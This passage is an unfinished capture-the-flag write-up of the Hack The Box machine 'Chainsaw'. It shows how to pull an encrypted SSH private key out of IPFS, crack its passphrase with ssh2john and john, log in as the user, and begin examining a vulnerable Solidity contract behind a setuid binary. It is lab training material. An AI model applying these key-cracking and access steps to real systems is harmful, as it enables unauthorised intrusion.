If you are searching for a more efficient way of locating the file, this one-liner is a simple way of running through each file quickly and determining its contents:

```bash
for i in $(ipfs refs local); do ipfs ls $i; done;
```

This will lead to the `.eml` files being displayed, similarly to the above example.

I was only interested in the one belonging to `bobby` (for obvious reasons), so I used `ipfs get <hash>` in order to grab the file:

```python
administrator@chainsaw:~/.ipfs$ ipfs get QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 
Saving file(s) to QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF
 4.53 KiB / 4.53 KiB [=====================================================================] 100.00% 0s
administrator@chainsaw:~/.ipfs$ ls -al
total 44
drwxrwxr-x  5 administrator administrator 4096 Dec 20 01:15 .
drwxr-x--- 10 administrator administrator 4096 Dec 20 00:48 ..
drwxr-xr-x 41 administrator administrator 4096 Dec 20 01:15 blocks
-rw-rw----  1 administrator administrator 5273 Dec 13  2018 config
drwxr-xr-x  2 administrator administrator 4096 Dec 20 01:15 datastore
-rw-------  1 administrator administrator  190 Dec 13  2018 datastore_spec
drwx------  2 administrator administrator 4096 Dec 13  2018 keystore
-rw-rw-r--  1 administrator administrator 4629 Dec 20 01:15 QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF  <--- Here's the file now!
-rw-r--r--  1 administrator administrator    2 Dec 13  2018 version
```

I went ahead and viewed the file afterwards:

```python
administrator@chainsaw:~/.ipfs$ cat QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 
X-Pm-Origin: internal
X-Pm-Content-Encryption: end-to-end
Subject: Ubuntu Server Private RSA Key
From: IT Department <chainsaw_admin@protonmail.ch>
Date: Thu, 13 Dec 2018 19:28:54 +0000
Mime-Version: 1.0
Content-Type: multipart/mixed;boundary=---------------------d296272d7cb599bff2a1ddf6d6374d93
To: bobbyaxelrod600@protonmail.ch <bobbyaxelrod600@protonmail.ch>
X-Attached: bobby.key.enc
Message-Id: <zctvLwVo5mWy8NaBt3CLKmxVckb-cX7OCfxUYfHsU2af1NH4krcpgGz7h-PorsytjrT3sA9Ju8WNuWaRAnbE0CY0nIk2WmuwOvOnmRhHPoU=@protonmail.ch>
Received: from mail.protonmail.ch by mail.protonmail.ch; Thu, 13 Dec 2018 14:28:58 -0500
X-Original-To: bobbyaxelrod600@protonmail.ch
Return-Path: <chainsaw_admin@protonmail.ch>
Delivered-To: bobbyaxelrod600@protonmail.ch

-----------------------d296272d7cb599bff2a1ddf6d6374d93
Content-Type: multipart/related;boundary=---------------------ffced83f318ffbd54e80374f045d2451

-----------------------ffced83f318ffbd54e80374f045d2451
Content-Type: text/html;charset=utf-8
Content-Transfer-Encoding: base64

PGRpdj5Cb2JieSw8YnI+PC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj5JIGFtIHdyaXRpbmcgdGhp
cyBlbWFpbCBpbiByZWZlcmVuY2UgdG8gdGhlIG1ldGhvZCBvbiBob3cgd2UgYWNjZXNzIG91ciBM
aW51eCBzZXJ2ZXIgZnJvbSBub3cgb24uIER1ZSB0byBzZWN1cml0eSByZWFzb25zLCB3ZSBoYXZl
IGRpc2FibGVkIFNTSCBwYXNzd29yZCBhdXRoZW50aWNhdGlvbiBhbmQgaW5zdGVhZCB3ZSB3aWxs
IHVzZSBwcml2YXRlL3B1YmxpYyBrZXkgcGFpcnMgdG8gc2VjdXJlbHkgYW5kIGNvbnZlbmllbnRs
eSBhY2Nlc3MgdGhlIG1hY2hpbmUuPGJyPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+QXR0YWNo
ZWQgeW91IHdpbGwgZmluZCB5b3VyIHBlcnNvbmFsIGVuY3J5cHRlZCBwcml2YXRlIGtleS4gUGxl
YXNlIGFzayZuYnNwO3JlY2VwdGlvbiBkZXNrIGZvciB5b3VyIHBhc3N3b3JkLCB0aGVyZWZvcmUg
YmUgc3VyZSB0byBicmluZyB5b3VyIHZhbGlkIElEIGFzIGFsd2F5cy48YnI+PC9kaXY+PGRpdj48
YnI+PC9kaXY+PGRpdj5TaW5jZXJlbHksPGJyPjwvZGl2PjxkaXY+SVQgQWRtaW5pc3RyYXRpb24g
RGVwYXJ0bWVudDxicj48L2Rpdj4=
-----------------------ffced83f318ffbd54e80374f045d2451--
-----------------------d296272d7cb599bff2a1ddf6d6374d93
Content-Type: application/octet-stream; filename="bobby.key.enc"; name="bobby.key.enc"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="bobby.key.enc"; name="bobby.key.enc"

LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBERVMtRURFMy1DQkMsNTNEODgxRjI5OUJBODUwMwoKU2VDTll3L0JzWFB5UXExSFJM
RUVLaGlOSVZmdFphZ3pPY2M2NGZmMUlwSm85SWVHN1ovemordjFkQ0lkZWp1awo3a3RRRmN6VGx0
dG5ySWo2bWRCYjZybk42Q3NQMHZiejlOelJCeWcxbzZjU0dkckwyRW1KTi9lU3hENEFXTGN6Cm4z
MkZQWTBWamxJVnJoNHJqaFJlMndQTm9nQWNpQ0htWkdFQjB0Z3YyL2V5eEU2M1ZjUnpyeEpDWWwr
aHZTWjYKZnZzU1g4QTRRcjdyYmY5Zm56NFBJbUlndXJGM1ZoUW1kbEVtekRSVDRtL3BxZjNUbUdB
azkrd3JpcW5rT0RGUQpJKzJJMWNQYjhKUmhMU3ozcHlCM1gvdUdPVG5ZcDRhRXErQVFaMnZFSnoz
RmZYOVNYOWs3ZGQ2S2FadFNBenFpCnc5ODFFUzg1RGs5TlVvOHVMeG5aQXczc0Y3UHo0RXVKMEhw
bzFlWmdZdEt6dkRLcnJ3OHVvNFJDYWR4N0tIUlQKaW5LWGR1SHpuR0ExUVJPelpXN3hFM0hFTDN2
eFI5Z01WOGdKUkhEWkRNSTl4bHc5OVFWd2N4UGNGYTMxQXpWMgp5cDNxN3lsOTU0U0NNT3RpNFJD
M1o0eVVUakRrSGRIUW9FY0dpZUZPV1UraTFvaWo0Y3J4MUxiTzJMdDhuSEs2CkcxQ2NxN2lPb240
UnNUUmxWcnY4bGlJR3J4bmhPWTI5NWU5ZHJsN0JYUHBKcmJ3c284eHhIbFQzMzMzWVU5ZGoKaFFM
TnA1KzJINCtpNm1tVTN0Mm9nVG9QNHNrVmNvcURsQ0MrajZoRE9sNGJwRDl0NlRJSnVyV3htcEdn
TnhlcwpxOE5zQWVudGJzRCt4bDRXNnE1bXVMSlFtai94UXJySGFjRVpER0k4a1d2WkUxaUZtVmtE
L3hCUm53b0daNWh0CkR5aWxMUHBsOVIrRGg3YnkzbFBtOGtmOHRRbkhzcXBSSGNleUJGRnBucTBB
VWRFS2ttMUxSTUxBUFlJTGJsS0cKandyQ3FSdkJLUk1JbDZ0SmlEODdOTTZKQm9ReWRPRWNwbis2
RFUrMkFjdGVqYnVyMGFNNzRJeWVlbnJHS1NTWgpJWk1zZDJrVFNHVXh5OW8veFBLRGtVdy9TRlV5
U21td2lxaUZMNlBhRGd4V1F3SHh0eHZtSE1oTDZjaXROZEl3ClRjT1RTSmN6bVIycEp4a29oTHJI
N1lyUzJhbEtzTTBGcEZ3bWR6MS9YRFNGMkQ3aWJmL1cxbUF4TDVVbUVxTzAKaFVJdVcxZFJGd0hq
TnZhb1NrK2ZyQXA2aWM2SVBZU21kbzhHWVl5OHBYdmNxd2ZScHhZbEFDWnU0RmlpNmhZaQo0V3Bo
VDNaRllEcnc3U3RnSzA0a2JEN1FrUGVOcTlFdjFJbjJuVmR6RkhQSWg2eitmbXBiZ2ZXZ2VsTEhj
MmV0ClNKWTQrNUNFYmtBY1lFVW5QV1k5U1BPSjdxZVU3K2IvZXF6aEtia3BuYmxtaUsxZjNyZU9N
MllVS3k4YWFsZWgKbkpZbWttcjN0M3FHUnpoQUVUY2tjOEhMRTExZEdFK2w0YmE2V0JOdTE1R29F
V0Fzenp0TXVJVjFlbW50OTdvTQpJbW5mb250T1lkd0I2LzJvQ3V5SlRpZjhWdy9XdFdxWk5icGV5
OTcwNGE5bWFwLytiRHFlUVE0MStCOEFDRGJLCldvdnNneVdpL1VwaU1UNm02clgrRlA1RDVFOHpy
WXRubm1xSW83dnhIcXRCV1V4amFoQ2RuQnJrWUZ6bDZLV1IKZ0Z6eDNlVGF0bFpXeXI0a3N2Rm10
b2JZa1pWQVFQQUJXeitnSHB1S2xycWhDOUFOenIvSm4rNVpmRzAybW9GLwplZEwxYnA5SFBSSTQ3
RHl2THd6VDEvNUw5Wno2WSsxTXplbmRUaTNLcnpRL1ljZnI1WUFSdll5TUxiTGpNRXRQClV2SmlZ
NDB1Mm5tVmI2UXFwaXkyenIvYU1saHB1cFpQay94dDhvS2hLQytsOW1nT1RzQVhZakNiVG1MWHpW
clgKMTVVMjEwQmR4RUZVRGNpeE5pd1Rwb0JTNk1meENPWndOLzFadjBtRThFQ0krNDRMY3FWdDN3
PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=
-----------------------d296272d7cb599bff2a1ddf6d6374d93--
```

It appears to be an email thread containing an ssh keypair for `bobby`. However, the private key is `bobby.key.enc` and not `bobby.key` as expected. Simply looking at it though, it appears to be encoded in `base64`. I decided I would attempt to decode it locally first:

```python
➜  HTB-CHAINSAW cat bobby.key.enc.b64 |base64 -d
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,53D881F299BA8503

SeCNYw/BsXPyQq1HRLEEKhiNIVftZagzOcc64ff1IpJo9IeG7Z/zj+v1dCIdejuk
7ktQFczTlttnrIj6mdBb6rnN6CsP0vbz9NzRByg1o6cSGdrL2EmJN/eSxD4AWLcz
n32FPY0VjlIVrh4rjhRe2wPNogAciCHmZGEB0tgv2/eyxE63VcRzrxJCYl+hvSZ6
fvsSX8A4Qr7rbf9fnz4PImIgurF3VhQmdlEmzDRT4m/pqf3TmGAk9+wriqnkODFQ
I+2I1cPb8JRhLSz3pyB3X/uGOTnYp4aEq+AQZ2vEJz3FfX9SX9k7dd6KaZtSAzqi
w981ES85Dk9NUo8uLxnZAw3sF7Pz4EuJ0Hpo1eZgYtKzvDKrrw8uo4RCadx7KHRT
inKXduHznGA1QROzZW7xE3HEL3vxR9gMV8gJRHDZDMI9xlw99QVwcxPcFa31AzV2
yp3q7yl954SCMOti4RC3Z4yUTjDkHdHQoEcGieFOWU+i1oij4crx1LbO2Lt8nHK6
G1Ccq7iOon4RsTRlVrv8liIGrxnhOY295e9drl7BXPpJrbwso8xxHlT3333YU9dj
hQLNp5+2H4+i6mmU3t2ogToP4skVcoqDlCC+j6hDOl4bpD9t6TIJurWxmpGgNxes
q8NsAentbsD+xl4W6q5muLJQmj/xQrrHacEZDGI8kWvZE1iFmVkD/xBRnwoGZ5ht
DyilLPpl9R+Dh7by3lPm8kf8tQnHsqpRHceyBFFpnq0AUdEKkm1LRMLAPYILblKG
jwrCqRvBKRMIl6tJiD87NM6JBoQydOEcpn+6DU+2Actejbur0aM74IyeenrGKSSZ
IZMsd2kTSGUxy9o/xPKDkUw/SFUySmmwiqiFL6PaDgxWQwHxtxvmHMhL6citNdIw
TcOTSJczmR2pJxkohLrH7YrS2alKsM0FpFwmdz1/XDSF2D7ibf/W1mAxL5UmEqO0
hUIuW1dRFwHjNvaoSk+frAp6ic6IPYSmdo8GYYy8pXvcqwfRpxYlACZu4Fii6hYi
4WphT3ZFYDrw7StgK04kbD7QkPeNq9Ev1In2nVdzFHPIh6z+fmpbgfWgelLHc2et
SJY4+5CEbkAcYEUnPWY9SPOJ7qeU7+b/eqzhKbkpnblmiK1f3reOM2YUKy8aaleh
nJYmkmr3t3qGRzhAETckc8HLE11dGE+l4ba6WBNu15GoEWAszztMuIV1emnt97oM
ImnfontOYdwB6/2oCuyJTif8Vw/WtWqZNbpey9704a9map/+bDqeQQ41+B8ACDbK
WovsgyWi/UpiMT6m6rX+FP5D5E8zrYtnnmqIo7vxHqtBWUxjahCdnBrkYFzl6KWR
gFzx3eTatlZWyr4ksvFmtobYkZVAQPABWz+gHpuKlrqhC9ANzr/Jn+5ZfG02moF/
edL1bp9HPRI47DyvLwzT1/5L9Zz6Y+1MzendTi3KrzQ/Ycfr5YARvYyMLbLjMEtP
UvJiY40u2nmVb6Qqpiy2zr/aMlhpupZPk/xt8oKhKC+l9mgOTsAXYjCbTmLXzVrX
15U210BdxEFUDcixNiwTpoBS6MfxCOZwN/1Zv0mE8ECI+44LcqVt3w==
-----END RSA PRIVATE KEY-----
```

As expected, the private key was decoded with `base64` without any problems. However, it still appears to be encrypted, which is a bit of an issue. I decided I would combat this by utilizing `ssh2john` to obtain the hash of the key in a format recognizable by `john the ripper`, which I would then be able to crack accordingly with `rockyou.txt`.
<p><br></p>

I start with the hash conversion:

```python
➜  HTB-CHAINSAW /usr/share/john/ssh2john.py ./bobby.key.enc > bobby.key.enc.hash
```

Then ran `john` against the hash:

```python
➜  HTB-CHAINSAW john --wordlist=/usr/share/wordlists/rockyou.txt ./bobby.key.enc.hash
```

After only 12 seconds, I obtained the password `jackychain`:

```python
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
jackychain       (./bobby.key.enc)
1g 0:00:00:12 DONE (2019-12-19 20:27) 0.08278g/s 1187Kp/s 1187Kc/s 1187KC/sa6_123..*7¡Vamos!
Session completed
```

I was then able to SSH as `bobby` and `cat user.txt`!

```css
➜  HTB-CHAINSAW chmod 600 bobby.key.enc
➜  HTB-CHAINSAW ssh -i bobby.key.enc bobby@chainsaw.htb
Enter passphrase for key 'bobby.key.enc': jackychain
bobby@chainsaw:~$ cat /home/bobby/user.txt
af8d9df991cc[REDACTED...]
```

### ChainsawClub File Analysis

Upon achieving a shell as `bobby`, I immediately noticed a directory called `projects` with a sub-directory within it called `ChainsawClub`. The contents of the `ChainsawClub` directory are as follows:

```python
bobby@chainsaw:~/projects$ cd ChainsawClub && ls -al
total 156
drwxrwxr-x 2 bobby bobby   4096 Jan 23  2019 .
drwxrwxr-x 3 bobby bobby   4096 Dec 20  2018 ..
-rwsr-xr-x 1 root  root   16544 Jan 12  2019 ChainsawClub
-rw-r--r-- 1 root  root  126388 Jan 23  2019 ChainsawClub.json
-rw-r--r-- 1 root  root    1164 Jan 23  2019 ChainsawClub.sol
```

Hold on a second, this looks familiar...

<img src="/assets/img/writeups/HTB-CHAINSAW/CONFUSED-SAMOYED.GIF" class="chainsaw-img" alt="GIPHY - Confused Samoyed">

I tried running the `file` command against the `ChainsawClub` file, and discovered it is a 64-bit ELF setuid binary. Here is what its output looks like when ran:

```c++
bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub

      _           _
     | |         (_)
  ___| |__   __ _ _ _ __  ___  __ ___      __
 / __| '_ \ / _` | | '_ \/ __|/ _` \ \ /\ / /
| (__| | | | (_| | | | | \__ \ (_| |\ V  V /
 \___|_| |_|\__,_|_|_| |_|___/\__,_| \_/\_/
                                            club

- Total supply: 1000
- 1 CHC = 51.08 EUR
- Market cap: 51080 (€)

[*] Please sign up first and then log in!
[*] Entry based on merit.

Username: farbs
Password: 
[*] Wrong credentials!
```

So it's looking a lot like there will be more smart contract exploitation here. Digging deeper, I decided to take a look at the `Chainsaw.sol` file to get an idea of the functions I was working with:
<p><br></p>

`ChainsawClub.sol`:

```c++
bobby@chainsaw:~/projects/ChainsawClub$ cat ChainsawClub.sol
pragma solidity ^0.4.22;

contract ChainsawClub {

  string username = 'nobody';
  string password = '7b455ca1ffcb9f3828cfdde4a396139e';
  bool approve = false;
  uint totalSupply = 1000;
  uint userBalance = 0;

  function getUsername() public view returns (string) {
      return username;
  }
  function setUsername(string _value) public {
      username = _value;
  }
  function getPassword() public view returns (string) {
      return password;
  }
  function setPassword(string _value) public {
      password = _value;
  }
  function getApprove() public view returns (bool) {
      return approve;
  }
  function setApprove(bool _value) public {
      approve = _value;
  }
  function getSupply() public view returns (uint) {
      return totalSupply;
  }
  function getBalance() public view returns (uint) {
      return userBalance;
  }
  function transfer(uint _value) public {
      if (_value > 0 && _value <= totalSupply) {
          totalSupply -= _value;
          userBalance += _value;
      }
  }
  function reset() public {
      username = '';
      password = '';
      userBalance = 0;
      totalSupply = 1000;
      approve = false;
  }
}
```

So it looks like I can use the `setUsername()` and `setPassword()` functions to abuse account creation. It appears the password must also be in `md5` format, as displayed here:

```bash
string password = '7b455ca1ffcb9f3828cfdde4a396139e';
```

At this point, I also noticed the `setApprove()` function, which I imagined would need to be set from `false` to `true` as well as the `transfer()` function, which is likely used to transfer coins.
<p><br></p>

I initially tried bypassing the constraints with the provided username `nobody` and the password hash, but it didn't work. I also tried cracking the `md5` hash with Crackstation as well as with `john`, but that didn't work either. So, I created my own account called `farbs` to do some further testing.
<p><br></p>

Upon creating my user, I was now able to log in, but I received an error every time I tried to do anything:

### Writeup still in progress... Check back later for more!

<div align="center">
	<h3> Thanks for reading! </h3>
</div>
<div align="center">
<!-- add the button! -->
<applause-button style="width: 58px; height: 58px;" color="#5d4d7a" url="https://defarbs.com/"/>
</div>
<div align="center">
	<a href="https://www.hackthebox.eu/profile/39047">
		<img htb-logo="image" src="https://www.hackthebox.eu/badge/image/39047" alt="Hack The Box">
	</a>
</div>